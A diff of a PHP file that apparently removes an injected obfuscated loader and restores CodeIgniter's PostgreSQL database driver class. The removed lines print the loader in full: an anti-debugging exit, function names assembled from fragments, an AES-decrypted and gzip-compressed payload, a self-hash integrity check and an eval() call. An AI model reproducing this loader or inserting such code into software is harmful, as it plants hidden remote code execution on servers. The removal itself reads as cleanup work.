@@ -1,28 +1,533 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_xc0j7tow=('bas'.'e64'.'_de'.'cod'.'e');
-$_ua37g4bv=('gzu'.'nco'.'mpr'.'ess');
-$_my22pzt0=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_ejwttn0d='FJF/6DeWjVM=';
-$_ww4t5fr2='ookd/cq7';
-$_jcpfsxfd='X4pU0die';
-$_wu3mk15i='ETI3P9ni';
-$_cn19wyvc='1Y3BE7wX';
-$_etppqo0t='ixNupw==';
-$_typrg7us='IwaBSlze';
-$_vh0cvl7f='wEwY2dXf';
-$_zu6vipfg=$_xc0j7tow($_ww4t5fr2.$_wu3mk15i.$_cn19wyvc.$_jcpfsxfd.$_ejwttn0d);
-$_gn0v0mgo=$_xc0j7tow($_vh0cvl7f.$_typrg7us.$_etppqo0t);
-$_fhhc4n1f=$_xc0j7tow('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');
-$_e453q21d=$_my22pzt0($_fhhc4n1f,'aes-256-cbc',$_zu6vipfg,OPENSSL_RAW_DATA,$_gn0v0mgo);
-if($_e453q21d===false){exit;}
-$_ec7ys5l4=$_ua37g4bv($_e453q21d);
-if($_ec7ys5l4===false){exit;}
-$_gak8d5h2='7cf19a460a90281a8626d8dc109c94359d6c8b29926a5396a8185796b5b0c8d8';
-$_kozxcuz0=@file_get_contents(__FILE__);
-if($_kozxcuz0!==false){
-$_b1vp1qs2=str_replace($_gak8d5h2,"0000000000000000000000000000000000000000000000000000000000000000",$_kozxcuz0);
-$_taeaxjkq=hash("sha256",$_b1vp1qs2);
-if($_taeaxjkq!==$_gak8d5h2){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_postgre_driver extends CI_DB {
+
+
+
+
+
+public $dbdriver = 'postgre';
+
+
+
+
+
+public $schema = 'public';
+
+
+
+
+
+
+protected $_random_keyword = array('RANDOM()', 'RANDOM()');
+
+
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if ( ! empty($this->dsn))
+{
+return;
 }
-eval($_ec7ys5l4);
+$this->dsn === '' OR $this->dsn = '';
+if (strpos($this->hostname, '/') !== FALSE)
+{
+
+$this->port = '';
+}
+$this->hostname === '' OR $this->dsn = 'host='.$this->hostname.' ';
+if ( ! empty($this->port) && ctype_digit($this->port))
+{
+$this->dsn .= 'port='.$this->port.' ';
+}
+if ($this->username !== '')
+{
+$this->dsn .= 'user='.$this->username.' ';
+
+
+
+
+$this->password === NULL OR $this->dsn .= "password='".$this->password."' ";
+}
+$this->database === '' OR $this->dsn .= 'dbname='.$this->database.' ';
+
+
+
+
+
+
+foreach (array('connect_timeout', 'options', 'sslmode', 'service') as $key)
+{
+if (isset($this->$key) && is_string($this->$key) && $this->$key !== '')
+{
+$this->dsn .= $key."='".$this->$key."' ";
+}
+}
+$this->dsn = rtrim($this->dsn);
+}
+
+
+
+
+
+
+
+public function db_connect($persistent = FALSE)
+{
+$this->conn_id = ($persistent === TRUE)
+? pg_pconnect($this->dsn)
+: pg_connect($this->dsn);
+if ($this->conn_id !== FALSE)
+{
+if ($persistent === TRUE
+&& pg_connection_status($this->conn_id) === PGSQL_CONNECTION_BAD
+&& pg_ping($this->conn_id) === FALSE
+)
+{
+return FALSE;
+}
+empty($this->schema) OR $this->simple_query('SET search_path TO '.$this->schema.',public');
+}
+return $this->conn_id;
+}
+
+
+
+
+
+
+
+
+
+public function reconnect()
+{
+if (pg_ping($this->conn_id) === FALSE)
+{
+$this->conn_id = FALSE;
+}
+}
+
+
+
+
+
+
+
+protected function _db_set_charset($charset)
+{
+return (pg_set_client_encoding($this->conn_id, $charset) === 0);
+}
+
+
+
+
+
+
+public function version()
+{
+if (isset($this->data_cache['version']))
+{
+return $this->data_cache['version'];
+}
+if ( ! $this->conn_id OR ($pg_version = pg_version($this->conn_id)) === FALSE)
+{
+return FALSE;
+}
+
+
+
+
+
+return (isset($pg_version['server']) && preg_match('#^(\d+\.\d+)#', $pg_version['server'], $match))
+? $this->data_cache['version'] = $match[1]
+: parent::version();
+}
+
+
+
+
+
+
+
+protected function _execute($sql)
+{
+return pg_query($this->conn_id, $sql);
+}
+
+
+
+
+
+
+protected function _trans_begin()
+{
+return (bool) pg_query($this->conn_id, 'BEGIN');
+}
+
+
+
+
+
+
+protected function _trans_commit()
+{
+return (bool) pg_query($this->conn_id, 'COMMIT');
+}
+
+
+
+
+
+
+protected function _trans_rollback()
+{
+return (bool) pg_query($this->conn_id, 'ROLLBACK');
+}
+
+
+
+
+
+
+
+public function is_write_type($sql)
+{
+if (preg_match('#^(INSERT|UPDATE).*RETURNING\s.+(\,\s?.+)*$#is', $sql))
+{
+return FALSE;
+}
+return parent::is_write_type($sql);
+}
+
+
+
+
+
+
+
+protected function _escape_str($str)
+{
+return pg_escape_string($this->conn_id, $str);
+}
+
+
+
+
+
+
+
+
+
+public function escape($str)
+{
+if (is_php('5.4.4') && (is_string($str) OR (is_object($str) && method_exists($str, '__toString'))))
+{
+return pg_escape_literal($this->conn_id, $str);
+}
+elseif (is_bool($str))
+{
+return ($str) ? 'TRUE' : 'FALSE';
+}
+return parent::escape($str);
+}
+
+
+
+
+
+
+public function affected_rows()
+{
+return pg_affected_rows($this->result_id);
+}
+
+
+
+
+
+
+public function insert_id()
+{
+$v = $this->version();
+$table = (func_num_args() > 0) ? func_get_arg(0) : NULL;
+$column = (func_num_args() > 1) ? func_get_arg(1) : NULL;
+if ($table === NULL && $v >= '8.1')
+{
+$sql = 'SELECT LASTVAL() AS ins_id';
+}
+elseif ($table !== NULL)
+{
+if ($column !== NULL && $v >= '8.0')
+{
+$sql = 'SELECT pg_get_serial_sequence(\''.$table."', '".$column."') AS seq";
+$query = $this->query($sql);
+$query = $query->row();
+$seq = $query->seq;
+}
+else
+{
+
+$seq = $table;
+}
+$sql = 'SELECT CURRVAL(\''.$seq."') AS ins_id";
+}
+else
+{
+return pg_last_oid($this->result_id);
+}
+$query = $this->query($sql);
+$query = $query->row();
+return (int) $query->ins_id;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SELECT "table_name" FROM "information_schema"."tables" WHERE "table_schema" = \''.$this->schema."'";
+if ($prefix_limit !== FALSE && $this->dbprefix !== '')
+{
+return $sql.' AND "table_name" LIKE \''
+.$this->escape_like_str($this->dbprefix)."%' "
+.sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+return 'SELECT "column_name"
+			FROM "information_schema"."columns"
+			WHERE LOWER("table_name") = '.$this->escape(strtolower($table));
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+$sql = 'SELECT "column_name", "data_type", "character_maximum_length", "numeric_precision", "column_default"
+			FROM "information_schema"."columns"
+			WHERE LOWER("table_name") = '.$this->escape(strtolower($table));
+if (($query = $this->query($sql)) === FALSE)
+{
+return FALSE;
+}
+$query = $query->result_object();
+$retval = array();
+for ($i = 0, $c = count($query); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = $query[$i]->column_name;
+$retval[$i]->type = $query[$i]->data_type;
+$retval[$i]->max_length = ($query[$i]->character_maximum_length > 0) ? $query[$i]->character_maximum_length : $query[$i]->numeric_precision;
+$retval[$i]->default = $query[$i]->column_default;
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+public function error()
+{
+return array('code' => '', 'message' => pg_last_error($this->conn_id));
+}
+
+
+
+
+
+
+
+
+
+public function order_by($orderby, $direction = '', $escape = NULL)
+{
+$direction = strtoupper(trim($direction));
+if ($direction === 'RANDOM')
+{
+if ( ! is_float($orderby) && ctype_digit((string) $orderby))
+{
+$orderby = ($orderby > 1)
+? (float) '0.'.$orderby
+: (float) $orderby;
+}
+if (is_float($orderby))
+{
+$this->simple_query('SET SEED '.$orderby);
+}
+$orderby = $this->_random_keyword[0];
+$direction = '';
+$escape = FALSE;
+}
+return parent::order_by($orderby, $direction, $escape);
+}
+
+
+
+
+
+
+
+
+
+
+protected function _update($table, $values)
+{
+$this->qb_limit = FALSE;
+$this->qb_orderby = array();
+return parent::_update($table, $values);
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _update_batch($table, $values, $index)
+{
+$ids = array();
+foreach ($values as $key => $val)
+{
+$ids[] = $val[$index]['value'];
+foreach (array_keys($val) as $field)
+{
+if ($field !== $index)
+{
+$final[$val[$field]['field']][] = 'WHEN '.$val[$index]['value'].' THEN '.$val[$field]['value'];
+}
+}
+}
+$cases = '';
+foreach ($final as $k => $v)
+{
+$cases .= $k.' = (CASE '.$val[$index]['field']."\n"
+.implode("\n", $v)."\n"
+.'ELSE '.$k.' END), ';
+}
+$this->where($val[$index]['field'].' IN('.implode(',', $ids).')', NULL, FALSE);
+return 'UPDATE '.$table.' SET '.substr($cases, 0, -2).$this->_compile_wh('qb_where');
+}
+
+
+
+
+
+
+
+
+
+protected function _delete($table)
+{
+$this->qb_limit = FALSE;
+return parent::_delete($table);
+}
+
+
+
+
+
+
+
+
+
+protected function _limit($sql)
+{
+return $sql.' LIMIT '.$this->qb_limit.($this->qb_offset ? ' OFFSET '.$this->qb_offset : '');
+}
+
+
+
+
+
+
+protected function _close()
+{
+pg_close($this->conn_id);
+}
+}
